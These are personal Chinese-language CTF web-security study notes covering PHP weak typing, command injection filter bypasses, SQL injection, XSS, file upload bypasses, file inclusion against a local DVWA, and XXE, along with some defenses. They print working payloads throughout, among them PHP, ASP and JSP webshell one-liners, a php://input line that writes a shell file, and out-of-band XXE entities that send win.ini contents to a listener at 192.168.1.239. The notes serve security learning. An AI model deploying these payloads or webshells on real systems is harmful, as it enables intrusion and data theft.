---
title: ctf
updated: 2023-07-19 15:51:11Z
created: 2023-07-19 15:32:18Z
latitude: 30.57281600
longitude: 104.06680100
altitude: 0.0000
---

# ctf
## 弱类型比较
### 比较原则：
字符串和数字比较
``
var_dump(“123admin”==123)        True
var_dump(“123a123123”==123)      True
var_dump(“admin”==0)             True
var_dump(“0e2343”==”0e234355”)   True (科学计数法)
``

字符串中未包含’.’ ’e’ ‘E’数值在整型范围内字符串会被当作int来取值。其它情况被当作float来取值

``<?php
$test=1+”10.5”  //$test=11.5(float)
$test=1+”-1.3e3”  //$test=-1299(float)
$test=1+”asdfdsf”  //$test=1(int)
$test=1+”3admin”  //$test=4(int)
?>
``
## 哈希绕过
### MD5绕过
\$a!=\$b;
md5(\$a)==md5(\$b);
科学计数法：0e32232...  (32位的MD5，找到0e开头的MD5对应的原型值)
数组绕过。$a=arry(),$b=arry().md5会返回NULL
md5碰撞(查相同md5值的不同字符串)

### 变量覆盖
#### 用传参改变原有变量的值
##### extract()函数
从数组中将变量导入当前的符号表，该函数使用数组键名为变量名，使用数组键值为变量值
``<?php
    $a = "original";
    $my_arry = arry("a"=>"Cat","b"=>"Dog","c"=>"Horse");
    extract($my_arry);
    echo"\$a=$a;\$b=$b;\$c=$c";
?>``
##### parse_str()函数
把查询字符串解析到变量中
例如：
``parse_str("name=Bill&age=60")
    //将变量$name=Bill;$age=60;添加进变量``

## 命令执行漏洞
在操作系统上执行命令。当应用需要调用一些外部程序去处理内容的情况下，就会执行一些系统命令的函数。如PHP中的system，exec，shell_exec等
<?php
    $username=$_GET['username'];
    //当username=sdf;ls -a（拼接Linux命令时就可能产生问题）
    system("mkdir $username"); //变量$username有操作空间
?>
程序过滤不严谨，导致代码注入并执行的函数：
eval(),assert(),preg_replace(),call_user_func()等
命令执行函数，参数不严谨，导致恶意命令执行：
system(),exec(),shell_exec(),passthru(),pctnl_exec(),popen(),proc_open()
注：反引号时shell_exec()的别名

漏洞的利用
利用传参拼接命令从而实现漏洞利用

联合执行
分号
cmd1;cmd2;cmd3
&&
cmd1&&cmd2&&cmd3                                                                                                                                                                                            
||
cmd1||cmd2||cmd3
换行符
%0a,%0d
反弹shell
无回显，带出，延时盲注

Bypass(绕过)
空格
\$IFS
\$IFS$9
<
<>
{cat,flag.php}//用逗号实现空格功能
%20
%09
关键字
ca\t y1n\g.php	反斜线绕过（转义，普通字母转义和原字母相同）
cat y1’’ng.php		两个单引号绕过
编码绕过
echo	 ”<base64加密的字符串>” |base64 -d|bash 	base64编码绕过
echo “<hex加密字符串>” |xxd -r -p |bash 	hex编码绕过
通配符绕过
cat y1 [n] g.php	cat y1n*		cat y1n? 		cat y1{a..z}g	

拼接
‘fla’+’g’ 	‘fla’’g’	(python中可用)
‘fla’.’g’			(php)

内联执行
 cat \`ls |grep fla\`	先执行反引号里面的
 cat $(ls |grep fla)	限制性$()里面的
变量绕过

代码执行漏洞
eval()函数	把一个字符串当作PHP代码来执行
一句话木马
<?php eval($_POST[0]);?>

无字母数字RCE
过滤了字母和数字，绕过方法
按位异或和取反
用%xff和字符按位异或的到字符串
<?='abc'    //等价<?echo 'abc'
?><?=`/???/???%20*`		//绕过各种过滤
create_function()

## SQL注入
### 联合查询注入
判断是否存在注入以及注入的数据类型字符型还是数字型
#### 拼接命令
select username from table where id =’1‘ or ‘1’=’1 ‘;
 猜解查询SQL语句中的字段数(有多少列)
用order by来进行猜解
select username from table where id =’1‘ order by 1 #’;
确定显示字段的顺序（两个字段数要相同）#注释，等价替换--+
利用union来确定
select username from table where id =’1’ union select 1,2 #’;
获取数据库名
输入1’ union select 1, database() # 返回数据库函数名
获取数据库的表名
输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
group_contact()将输出结果输出到一行，information_schema是MySQL的信息数据库，存放着其他数据库的信息
获取表的字段名
1’ union select 1,group_contact(column_name) from information_schema.columns where table_name=’users’#
让自己的查询结果变成第一个查询语句。让第一个查询结果变成空
1’ and 1=2 union select 1,group_contact(column_name) from information_schema.columns where table_name=’users’#
group_contact()的替换方法limit 
查询数据
1’ or 1=1 union select group_contact(user_id,first_name,last_name),group_contact(password) from users #

### SQL报错注入
没法使用联合查询注入union时使用，不能过滤一些关键函数
updatexml()函数，操纵xml
语法updatexml(xml_document,xpath_string,new_value)
updatexml是由于参数格式不正确而产生的错误，同样也会返回参数信息
payload:updatexml(1,concat(0x7e,(select user()),0x7e),1) 		0x7e是~
前后添加~使不符合xpath格式从而报错
extractvalue(xml_document,xpath_string)同理

### 布尔型盲注
布尔状态：
回显不同、HTTP响应码不同、HTTP响应头变化、基于错误的布尔注入、用and来影响查询结果，字符串截取和比较
精确截取：subtr(),mid() 
substr(string,start,len) 截取字符串
substr(str from start for len) 逗号被过滤的同等替换
select username from table where id =1 and substr(select database(),1,1)=’a’;
substr(select database(),2,1)=’b’;
截取数据库首字母，与a比较能查询成功则说明数据库首字母为a，以此类推，得到数据库的名字
粗略截取： right()，left()
right()从右边截取 结合ascii码 ascii(string)（返回字符串首字母的ascii值
） 实现精确查找
select username from table where id =1 and ascii(right(string,1))>1;
可以用比较ascii值来进行查找（用二分查找提高效率），ascii()的替换函数ord()
left()从左边截取 使用reverse()（将字符串逆序排序）再结合ascii()实现精确查找
select select username from table where id =1 and ascii(reverse(left(string,1)))>1;
其它截取方法trim()
trim([both/leading/trailing] string_piece from string) 将目标字符串从源字符串中移除
trim(leading x from string) =trim(leading x+1 from string) 一旦不相等则说明正确结果在x和x+1中（x是一个字符变量）
然后执行
trim(leading x+1 from string) = trim(leading x+2 from string) 相等则说明x为正确字符，否则为x+1

### 比较
like
select select username from table where id =1 and select database() like ‘abc%’;
regexp rlike（正则比较）
select select username from table where id =1 and select database() regexp “^CTF”;
select database() rlike “^CTF”;	（rlike同义替换，大小写不敏感）
select select username from table where id =1 and select binary database() regexp “^CTF”;
select binary database() rlike “^CTF”;（rlike同义替换，大小写敏感）
between  and （闭区间）、in（大小写不敏感，binary）
xor异或
id=‘1’^(substr()=’a’)^’1’; 不能使用注释符的情况下使用异或与后面的’形成闭合。“=”也行
id=‘1’=(substr()=’a’)=’1’;
### 时间型盲注
条件表达式
case 
when expr1 then expr2 
when expr3 then expre4
else expr4 end;
if(epxr1,expr2,epxr3)如果expr1为真则返回expr2,否则返回expr3	
sleep()函数
用条件表达是来构造sleep(),来判断是否盲注成功
if(substr()=’a’,sleep,0)
### 报错注入
exp(x) 	e的x次方 
利用该函数的返回值太大而报错
select if(subtr()=’a’,exp(5000),0);
Cookie和Session
Cookie:用来维持状态的token。保存在客户端
Session：用来存储特定用户会话所需的信息。保存在服务端，判断用户是否登录，购物车

## JavaScript
 BOM:javascript用来和浏览器进行交互
alert():警告弹窗
confirm():确认弹窗
prompt():提示弹窗
document.cookie:显示 cookie信息
screen:获取浏览器信息
location:获取控制页面信息
## XSS跨站脚本漏洞攻击
危害：获取用户信息（浏览器信息，IP地址，cookie信息）
 		  钓鱼（利用xss漏洞构造登录框骗取用户账户密码等）
  注入木马或广告（在网站注入非法链接）
  后台增删改网站数据等操作（配合CSRF漏洞，骗取用户点击，利用js模拟浏览器发包）
XSS蠕虫（点击就自动关注，自动回复等）
基础类型
### 反射性XSS
用于钓鱼、引流、配合其它漏洞CSRF
存储型XSS
攻击范围广、流量传播大可配合其它漏洞
DOM型XSS
配合、长度大小不受限制

仅执行一次，非持久型；参数型跨站脚本
利用场景：输入框、改url参数

绕过：
大小写
双写	<scr<script>ipt>
报错执行（通过报错使得执行替换的脚本）
<img src=1 onerror=alter()>
<:同等替换&lt
>:同等替换&gt

防御手段：
str_replace()字符串匹配
preg_replace()正则匹配
htmlspecialchars()特殊字符匹配
script_tags():去除html标签 是二进制安全的
trim():去除空格

### 存储型XSS
 恶意脚本存储在服务器数据库中，当用户访问包含恶意代码的页面时，服务器未经过严格的过滤而导致代码执行
多见与评论留言个人信息等处
搜索快捷键 ctr+f

### DOM型XSS
主要通过js操作document，实现重构dom树
在客户端执行
主要存在与用户能够修改页面的dom，造成客户端payload在浏览器中执行
XSS接收平台
blue-lotus
xss绕过
<>被过滤
在特殊标签下的时候可以构造一些使事件触发
“autofocus onfocus=alert(1)
弹窗：alert、prompt、confirm
<a herf=data:text/html;base64,[base64加密的<script>脚本]>
<svg/onload=prompt(1)>
on事件被过滤（onclick,onerror，oninput等）
<a href=”javascript:alert(1);”>xss</a>	js伪协议
<form><buttuon formation=javascript&colon;alert(1)>M  firfox可以
<img/src=x/onerror=alert(1)>
<M/onclick=alert(1)>M

防御：
防止注入
防止执行
黑名单，过滤：
如：<, 	>, 	%, 	#, 	/, 	”, 	’, 	;, 	(, 	), 	script, 	svg, 	object,	 on事件
白名单：只允许特定字符
限制输入数据的类型
编码以及转义
伪协议绕过
输出在标签或者属性中进行html编码
输出在script标签中进行JavaScript编码
输出在url中进行url编码

cookie中设置httponly
Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的
确保脚本来源可信，哪些外部资源可以加载和执行（CSP策略）
不使用有缺陷的第三方库
防御函数：
PHP：htmlentieties(),htmlspecialchars() （htmlspecialcahrs默认不过滤单引号，设置qoutestyle为ENT_QOUTES才能过滤）
Python:cgi.escape()
ASP:Server.HTMLEncode()
ASP.NET:Server.HtmlEncode(),Microsoft Anti-Cross Site SCripting Library
Java:xssprtect(Open Source Library)
Node.js:node-validator
JavaScript编码
\uxxxx该写法为Unicode转义序列，表示一个字符，其中xxxx表示一个十六进制数，如“<”的Unicode编码为\u003c
JavaScript提供四种字符编码策略：
三个八进制数，个数不够前面补0如“e”的编码为”\145”
两个十六进制数，							  \x65
四个十六进制数								  \u0065
对于控制字符，使用C类型的转义风格\n,\r

会触发JavaScript的解析器地方：
直接嵌入<script>代码块中
通过<script src=...>加载外部文件中
各种HTML，CSS支持的Javascript：URL触发调用
CSS expression()语法与某些浏览器的XBL绑定
事件处理器，onload,onerror,onclick等
定时器，Time（setTimeout,setInterval）
eval()调用 
script标签中的HTML字符实体不会被解析解码
不能将圆括号、单双引号等控制字符，使用JavaScript编码
Unicode转义序列只能在标识符名称里的编码字符能够被正常解析

## sqlmap使用
sqlmap.py -u URL 			检测网站注入
sqplmap.py -u URL --dbs 	跑出数据库
sqlmap.py -u URL -D 数据库名 --tables 跑出指定数据库的表
sqlmap.py -u URL -D 数据库名 -T 表名 --columns 跑出列名
sqlmap.py -u URL -D 数据库名 -T 表名 -C 列名 --dump 跑出数据
……


## 文件上传
webshell:
webshell就是以asp,php,jsp或cgi等网页文件形式存在的一种命令执行环境，网页木马后门
攻击这可以通过网页后门获得网站服务器操作权限，控制网站服务器进行一系列操作
分类：
一句话木马：
小马：文件上传，体积小
大马：体积大，代码通常被加密
按脚本分类：
jsp,asp,aspx,php
特点：
webshell大多以动态脚本形式出现
webshell就是一个asp或php木马后门
webshell可以通过穿越服务器防火墙，攻击者与被控服务器交换的数据都是通过80端口传递
webshell一般不会在系统日志中留下记录，只会在web日志中留下数据传递记录
攻击流程：
利用web漏洞获取web权限
上传小马
上传大马
远程调用webshell执行命令
常见webshell:
PHP
<?php eval($_GET[pass]);?>
<?php eval($_POST[pass]);?>
ASP
<%eval request(“pass”)%>
ASPX
\<%@ Page Laguage=”Jscript”%><%eval(Request.Item[“pass”])%>
JSP
<%Rutime.getRuntime().exec(request.getParameter(“i”));%>’
执行原理
可执行脚本
HTTP数据包（$_GET,$PSOT,$COOKIES）
GET方式：
<?php eval($_GET[pass]);?>
POST方式：
<?php eval($_POST[pass]);?>
COOKIE方式：
<?php @$a=$_COOKIE[1];$b=";$c= ";@assert($b.$a);?>
数据传递

执行传递的数据
直接执行（eval,system,passthru）
文件包含执行（include,require）
动态函数执行（$a=”phpinfo”;$a();）
回调函数（arry_map等）

## # webshell的管理工具
菜刀，c刀（cknife），蚁剑，冰蝎，哥斯拉，Weevely（kali自带）
	上传流程：
		客户端以文件形式进行封装，通过网络协议进行发送到服务器。服务器进行解析，存储在硬盘上。
		通常以HTTP协议进行上传时，以POST请求发送至服务器，服务器同意后建立连接，并传输数据
	文件上传漏洞原因：
	服务器配置不当，开源编辑器的上传漏洞，文件上传限制被绕过，文件解析漏洞导致文件执行
	存在上传漏洞的地方：
		图片上传、头像上传、文档上传
	文件上传的检测方式：
		客户端JavaScript检测（检测文件扩展名）
		服务端MIME类型检测（检测content-type）
		服务器目录路径检测（检测跟path参数相关内容）
		服务端文件扩展名检测（检测文件extension相关内容）
	服务器内容检测（检测文件内容是否包含恶意代码）抓包更改数据类型
 


客户端检测绕过：
	客户端js代码进行检测，在本地禁用js代码即可；火狐的Noscript插件，IE中禁用js代码都可实现绕过，转包更改文件后缀也可
	判断js检测，没有用BP抓到包，而网站直接弹出文件的不符合规范。
服务器绕过：
	三个检测点：MIME类型，文件后缀，文件内容
 
MIME类型绕过
	常见的MIME类型(文件后缀名用于操作系统对文件的识别，而MIME用与数据传输场景中接收者对信息的识别)：
	html文件，text/html
	txt文件，text/plain
	pdf文档，application/pdf
	word文档，application/msword
	png图像，image/png
	gif图像，image/gif
	MPEG文件(视频，音频文件).mpg,.mepg:video/mpeg
	AVI文件（音频，视频文件）.avi，video/x-msvideo
绕过MIME类型的方法：
	抓包，修改上传数据包中的content-type类型绕过

文件后缀检测绕过：
	绕过黑名单：
1、	后缀大小写，（.Php）
2、	空格绕过（.php ）
3、	点绕过（.php.）
4、特殊文件后缀，php2,php3,php4,php5,phtml
windows特性：会对文件后缀以点，空格结尾的进行去除
如a.php. =>a.php
		5、::\$DATA绕过：
			如果黑名单没有对后缀名进行去::\$DATA处理，利用Windows下的NTFS文件系统的特性，可以在后缀名加::\$DATA,绕过a.php::\$DATA
		6、匹配Apache的解析漏洞
			apache解析文件时，从右往左进行解析，如不可识别再向左判断。如aa.php.owf.rar文件Apache不可识别解析，’.owf’和’.rar’这两种后缀，会解析成php文件
		7、htaccess文件
			配合名单列表绕过，上传一个自定义的htaccess，可轻松绕过各种检测
			.htaccess文件（分布式配置文件）。提供了针对目录改变配置的方法。在一个特定的文档中放置一个或多个指令文件，以作用于此目录及其子目录
			上传一个.htaccess文件使用该文件中的命令来解析匹配的上传的文件
			例如：
				``<FilesMatch “a.png”>
				SetHandler application/x-httpd-php
				</FilesMatch>``
				再上传一句话木马
		绕过白名单：
			利用00截断进行绕过（将保存路径使用00截断，防止文件名被随机命名，且能自行更改文件名）
			%00截断：
			url发送到服务器后被解码，这时还没有传到验证函数，也就是说验证函数接收到的不是%00字符，而是%00解码后的内容，即被解码成了0x00
			0x00截断：
			系统在对文件名进行读取时，如果遇到0x00，就会认为读取已经结束。但是注意是文件的十六进制内容里的0x00而不是文件中的00
			例如：
			a.php%00.png
			在GET请求中%00会被url解码成截断字符。
				在POST请求中不会被url解码，因此可以输入a.php .png，抓包后，将对应位
置的十六进制数20改为00从而得到截断字符。

文件内容绕过
	检测方式
检测上传文件处的文件幻数
文件加载检测调用API或函数对文件进行加载测试。常见的是图像渲染测试，更严格的二次渲染
文件幻数头绕过
	文件幻数（magic number）：用一个常量来标识文件的格式，可以用WinHex通过观察十六进制数，来确定文件类型，将十六进制数转换为字符写在文件头中
常见的文件幻数：
JPEG (jpg)，文件头：FFD8FF
PNG (png)，文件头：89504E47
GIF (gif)，文件头：47494638
TIFF (tif)，文件头：49492A00
Windows Bitmap (bmp)，文件头：424D
CAD (dwg)，文件头：41433130
Adobe Photoshop (psd)，文件头：38425053
Rich Text Format (rtf)，文件头：7B5C727466
XML (xml)，文件头：3C3F786D6C
HTML (html)，文件头：68746D6C3E
Email [thorough only] (eml)，文件头：44656C69766572792D646174653A
Outlook Express (dbx)，文件头：CFAD12FEC5FD746F
Outlook (pst)，文件头：2142444E
MS Word/Excel (xls.or.doc)，文件头：D0CF11E0
MS Access (mdb)，文件头：5374616E64617264204A
WordPerfect (wpd)，文件头：FF575043
Adobe Acrobat (pdf)，文件头：255044462D312E
Quicken (qdf)，文件头：AC9EBD8F
Windows Password (pwl)，文件头：E3828596
ZIP Archive (zip)，文件头：504B0304
RAR Archive (rar)，文件头：52617221
Wave (wav)，文件头：57415645
AVI (avi)，文件头：41564920
Real Audio (ram)，文件头：2E7261FD
Real Media (rm)，文件头：2E524D46
MPEG (mpg)，文件头：000001BA
MPEG (mpg)，文件头：000001B3
Quicktime (mov)，文件头：6D6F6F76
Windows Media (asf)，文件头：3026B2758E66CF11
MIDI (mid)，文件头：4D546864
绕过文件加载检测
在不破坏文件本身渲染在空白区填入代码，一般是图片的注释区
二次渲染的攻击方式-攻击加载器本身
二次渲染相当于把原本属于图像的数据部分抓取出来，再用自己的api或函数进行重新渲染，非图像数据的部分就被隔离开了
使用溢出攻击对文件加载器本身进行攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试。加载测试时被溢出攻击执行shellcode

web解析漏洞
	服务器解析漏洞
	apache：
	不认识的文件后缀名会从右往左进行解析，直到找到能够解析的文件名
	iis:
	目录解析
	www.xxx.com/xx.asp/xx.jpg
	默认把.asp目录下的文件都解析为asp文件
	文件解析 
	www.xxx.com/xx.asp;.jpg
	服务器默认不解析;后的内容
 
## 文件包含
文件包含漏洞概述
	开发人员将重复使用的代码写入一个文件，如导航栏，底部footer栏等。在调用该文件时没有经过严格过滤而导致执行了恶意代码
	常见漏洞代码
<?php
$filename=$_GET['filename'];
incude($filename);
?>
php中的文件包含函数
require组：
require：函数出现错误时,会直接报错并退出文件执行
require_once:出错直接退出，且包含一次。
include组：
include：函数出现错误时，会抛出一个警告然后继续执行
include_once:	函数出现错误时会抛出警告且仅执行一次
文件包含漏洞类型及利用
	包含文件的内容只要符合php语法就能被当作php代码执行，无关后缀名
	类型：					利用方式：
	本地文件包含LFI			包含本地敏感文件、上传文件
	远程文件包含RFI			包含攻击者指定的url文件

	例如：
	http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../file1.php
	包含日志文件执行木马
	本地文件包含
	利用file协议
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/windows/win.ini``
利用php://filter协议(用来查看源码。直接包含php文件时会被解析，不能看到源码，故使用filter协议来读取)
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/read/convert.base64-encode/resource=include.php``
利用zip://,bzip2://,zlib:/协议
zip://,bzip2://,zlib:/协议，利用条件为php版本大于5.3.0，都属于压缩流，可以访问压缩文件中的子文件
格式：``zip://[压缩文件绝对路径]#[压缩文件内的子文件名]``
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=zip://D:\phpstudy\php\www\DVWA\uploads\test.jpg%23test.php``
利用phar://协议
类似zip://协议，但可使用相对路径
格式：``phar://[压缩文件绝对路径|相对路径]/[压缩文件内的子文件名]``
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=phar://../../hackble/uploads/test.jpg/phpinfo.txt``

远程文件包含（要允许远程文件包含才可）
利用http://协议
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://......./phpinfo.php``
php.ini中allow_url_fopen=On、allow_url_include=On(php5.2之后默认为off)
利用php://input协议
用来接收post数据，将post请求中的数据当作php代码来执行
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://input
<?php fputs(fopen(“shell.php”,”w”),”<?php eval(\$_POST[‘xxxser’]);?>)?>(该行为post中的内容)``
利用data://协议
将原本的include的文件重定向到用户可控的输入流中。必须在双on的情况下才可使用
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=	data://text/plain,<?phpinfo();``

绕过方式
本地文件绕过
后端代码对上传的文件路径进行了处理，拼接上路径，文件名后缀等
%00截断
条件php版本小于5.3.4，magic_qoutes_gpc=off
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://......./phpinfo.php%00``
？截断
``http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://......./phpinfo.php？``
文件包含漏洞危害及防御
	获取敏感信息，命令执行、权限获取
	将allow_url_fopen和allow_url_include都设为off
	对包含的文件进行白名单限制，或设置包含目录，open_basedir
	检查用户输入，不允许输入../之类的跳转符
	检查变量是否初始化
	数据的验证和过滤

## 命令执行
	命令执行漏洞简介
	服务器没有对用户的输入进行严格的过滤从而导致任意系统命令执行
	危害：
	1、继承Web服务器程序的权限去执行系统命令或者读取文件
	2、反弹shell，获得目标服务器的权限
	3、进一步内网渗透
	命令执行利用
	远程代码执行（php函数）

	-eval函数
	eval(string $code)		将字符串作为php代码执行
	<?php @eval($_POST[‘cmd’]);?>

	-assert函数
	assert(mixed $assertion[, string $description] )	如果assertion为字符串则会当作php代码执行
	<?php @assert($_POST[‘cmd’])?>	(不需要以分号结尾)

	-preg_repalce函数
	preg_replace(mixed $pattern,mixed $repalcement, mixed $subject[, int $limit =-1[,int &$count]])	正则的搜索和替换，搜索subject中匹配pattern的部分，用replacement替换
	<?php preg_replace(“/test/e”,$_POST[“cmd”],”just tset”);?> （e为修饰符）
	PCER修饰符e：进行引用替换后会将替换后的字符串作为php代码执行以eval的方式执行 （5.0版本后被弃用）

	-arry_map函数
	arry_map(callable $callback, arry $arry[1, arry $...])	   返回数组，arry1每个元素应用callback函数之后的数组。callback函数形参的数量和传给arry_map()数组数量，两者必须一样。为数组每个元素应用回调函数
``	<?php
$func=$_GET[‘func’];
$cmd=$_POST[‘cmd’];
$arry[0]=$cmd;
$new_arry=arry_map($func,$arry);		(使用$func,来处理$arry)
echo $new_arry;
?>``

-create_function函数
create_function(string $args, string $code)	从传递的参数创建一个匿名函数，并为其返回一个唯一的名称。通常这些参数将作为单引号分割的字符串。保护变量不被解析使用双引号则需要进行转义。
``<?php
	$func=create_function(“,$_POST[‘cmd’]);
	$func();
?>``

-call_user_func函数
``call_user_func(callable $callback [, mixed $parameter [, mixed $...]])``
第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。把第一个参数作为回调函数调用
<?php
call_user_func(“assert”,$_POST[‘cmd’]);
//cmd=whoami
?>

-arry_filter函数
arry_filter(arry $arry [, callbable $callback [, int $flag=0]])	用回调函数过滤数组中的单元依次将arry数组中的每个值传递到callback函数
<?php
$cmd=$_POST[‘cmd’]
$arry=arry($cmd);
$func=$_GET[‘func’];
arry_filter($arry,$func);
//?func=system
//cmd=whoami
?>

-双引号
双引号里面如果有变量，php会将其替换为变量解释后的结果。单引号不会被处理。双引号中的函数不会被替换和执行。
<?php
echo “{${phpinfo()}};”
?>

远程系统命令执行
有远程命令操作接口。
使用场景：路由器，防火墙，入侵检测等设备的web管理界面
利用PHP的系统命令执行函数来调用系统命令并执行。
system(),exec(),shell_exec(),passthru(),penti_exec(),popen(),proc_pen(),反引号等
-exec函数
``exec(string $cmd[, arry &$output [, int &$return_var]])``	执行系统命令
-system
类似exec，system会直接返回结果，exec会返回结果最后一行
-passthru
直接将结果输出到浏览器，不返回任何值。可以输出二进制，如图像
-shell_exec
通过shell环境来进行调用系统命令
反弹shell（nc,telnet）
nc监听端口
telnet
	命令执行防护
	禁用高危系统函数
	``phpifo(),eval(),passthru(),chroot(),scandir(),chgrp(),chown(),shell_exec(),proc_open(),
proc_get_status(),ini_alter(),ini_restore(),dl(),pfsockopen(),openlog(),syslog(),readlink(),
symlink(),popepassthru(),stream_socket_server(),fsocket(),fsockopen``
	严格过滤特殊字符
	黑名单，白名单
	开启php的safe_mode
	命令执行试验
	


CSRF漏洞
	介绍
	跨站请求伪造（cross-site request forgery）
	跨站点，伪造的请求
	挟持用户在当前已登录的web应用程序上执行非本意的操作的攻击方法
	网站的cookie在浏览器中不会过期。只要不关闭浏览器或退出登录，就会默认为登录状态。
	
	利用
	寻找
	关注数据包：cookie，Referer,Authrization,CSRFtoken

逻辑漏洞
概述：
程序设计不足而产生的漏洞
分类：
url跳转漏洞(跳转,分享,密码修改)
	场景：制作钓鱼网站,配合xss漏洞执行js,配合CSRF,配合浏览器漏洞（CVE-2018-8174）
注意点：src，url，302，301
Bypass:
?绕过
url=https://www.baidu.com?www.xxx.com
@绕过
url=https://www.baidu.com@www.xxx.com
/或\绕过
url=https://www.baidu.com/www.xxx.com
#绕过
url=https://www.baidu.com#www.xxx.com
子域名绕过
url=https://www.baidu.com.xxx.com
畸形url绕过
url=https://www.baidu.com\.xxx.com
跳转转ip
url=https://www.ipaddressguide.com/ip
利用xip.io绕过
url=https://www.baidu.com.127.0.0.1.xip.io
短信轰炸
Bypass
	在mobile参数后面加%20空格、加字母、多参数多次叠加
任意密码重置漏洞
场景：
验证码可爆破、验证码回传、验证码为未绑定用户、用户混淆、本地验证绕过、跳过验证步骤、token可预测、同时向多个账户发送凭证、接收端可篡改、万能验证码
	可爆破：四位验证码
	
越权漏洞（抓包，改包）
平行越权：
在发送请求时观察请求参数，尝试修改用户id或者其它参数验证是否能查看不属于自己的数据，进行增删改查，成功则存在平行越权漏洞
垂直越权：
查看标识中是否有身份标识，比如userid,角色id之类的，有则尝试修改重新请求更高权限的操作。
支付逻辑漏洞
后端没有对关键数据包进行验证，传递过程中也没有做签名，导致可以篡改数据
修改优惠券金额、修改积分金额、无限制试用、修改优惠价、修改附属优惠状态、测试数据包未删除
条件竞争漏洞
多线程同时访问一个共享代码、变量、文件时。没有进行锁操作，会产生意想不到的操作
产生位置：文件上传、领优惠券、抽奖、转账
抓包重复发很多次。



逻辑漏洞思维：
删除参数、添加参数（可能含有隐藏参数）

XML
用于数据传输
\<?xml version="1.0" encoding="UTF-8"?>  //xml文档声明
\<book id="1">                           //自定义根元素book,id为1                
   \<name>xml</name>                    //自定义子元素
    \<author>xml</author>                
    \<year>2022</year>
\</book>                                 //根元素闭合
//xml文档必须有一个根元素
//元素必须有一个关闭元素
//标签对大小写敏感
//必须被正确的嵌套
//属性必须加引号


xml文档结构
 xml文档声明
 DTD文档类型定义(可选)
 文档元素
		<?xml version="1.0" encoding="UTF-8"?>  //xml文档声明
\<!DOCTYPE book[                         //DTD(文档类型定义)
\<!ELEMENT book(name,author,year)>
\<!ELEMENT name(#PCDATA)>
\<!ELEMENT author(#PCDATA)>
\<!ELEMENT year(#PCDATA)>
]>                  
\<book>                                  //文档元素
    \<name>xml\</name>                   
    \<author>xml\</author>                
    \<year>2022\</year>
\</book>

DTD
document type define 文件类型定义，用来为xml文档定义语法约束
<!DOCTYPE book[                         //内部声明
<!ELEMENT book(name,author,year)>
<!ELEMENT name(#PCDATA)>
<!ELEMENT author(#PCDATA)>
<!ELEMENT year(#PCDATA)>
]>                  
<!DOCTYPE book SYSTEM "http://.../a.dtd">   //外部声明	

PCDATA
被解析的字符数据
当包含&、<、>实体时需要用&amp,&lt,&gt来进行替换
<book>                                  //传输<xml>这个数据
    <name>&ltxml&gt</name>                   
</book>

CDATA
不应由解析器解析的数据
语法：
<![CADATA[内容]]>   //包含在这里的内容都不会被解析不允许嵌套

DTD的实体
    内部普通实体              
<!ETITY name "value"> 
    引用
    &name;
    外部普通实体
    <!ENTITY name SYSTEM "URL"> //个人的
    <!ENTITY name PUBLIC "DTD name" "URI"> //公用的
    实例
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM 
    "php://filter/read=convert.base64-encode/rescource=URL "
    >
]>

    参数实体（引用不能在DTD区,在DTD文档中或非DTD区可以引用）
    <!ENTITY % name "value">        内部声明
<!ENTITY % name SYSTEM "URL">   外部声明
    引用
%name;
    实例
    <!ENTITY % name "<!ENTITY name1 "bar">">
%name;					//会显示bar

<!ENTITY % name "value"> 	//非法的
<!ETITY a "%name;"> 			//虚将该行定义在一个DTD文档中，然后用普通外部实体引用	
&a;
xml不允许将内部实体和外部实体结合使用``


XXE
XML外部实体注入攻击，发生在应用程序解析XML输入时，没有禁止外部实体加载，导致攻击者可以通过XML外部实体获得服务器数据
有回显的XXE
有回显的情况会直接在页面中看到payload的执行情况
发送带有XXE有效负载的请求，并从包含某些数据的web应用程序获取响应
无回显的XXE
无回显的XXE可以使用外带数据通道提取数据即带外XML外部实体（OOB-XXE）
漏洞发现
寻找接受xml作为输入内容的端点
修改http请求方法，Content-Type头部字段等方法，查看响应，发送内容是否被解析。解析了则可能有XXE漏洞
如果站点解析xml,尝试引用实体和DTD
如果可以引用外部实体则存在XXE漏洞
XXE的利用
有回显的
本地文件读取
file:///
若为php程序，则php://filter
当读取的文件包含了<或&,使用CDATA,利用外部参数实体
无回显的
外带数据，把数据发送到远程服务器上
利用思路：
通过外部DTD的方式将内部参实体的内容与外部DTD声明实体的内拼接起来
利用payload来从目标主机读取到内容后，将文件内容作为url的一部分来请求本地的监听窗口
XML解析器不会解析同级参数实体
<?xml version="1.0"?>       
    <!DOCTYPE message[
        <!ENTITY % files SYSTEM "file:///c:/windows/win.ini">
        <!ENTITY % send SYSTEM "http://192.168.1.239:9000/?a=%files;" > %files不会被解析
        %send;
    ]>
</message>

<?xml version="1.0"> 	//不同级，但不符合参数实体的引用规则
    <!DOCTYPE message[
        <!ENTITY % files SYSTEM "file:///c:windows/win.ini">
        <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.239:9000/?%files;'>"
        %start;
        %files
    ]>
</message>

进行外部引用
<?xml version="1.0"> 	
    <!DOCTYPE message[
        <!ENTITY files SYSTEM "http://192.168.1.239:9000/demo.dtd">
       &file;
    ]>
</message>


在demo.dtd文件中
 <!ENTITY % files SYSTEM "file:///d:/1.txt">
 <!ENTITY % int  SYSTEM "<!ENTITY &#37; send SYSTEM 'http://192.168.1.239:9000/%files;'>">



通过excel上传xxe
将excel后缀名改为zip后添加引用外部实体访问路径。再将文件后缀修改回来。监听本地的端口即可

修复：
过滤用户输入的xml数据
禁止引用外部实体即可                                                                           




SSRF
服务端请求伪造攻击
攻击者构造攻击链接传给服务端执行造成的漏洞，一般用来外网探测和内网攻击服务
从其它服务器
攻击者传入一个未经验证的URL，后端代码直接请求就会造成SSRF
场景：
从web功能点寻找
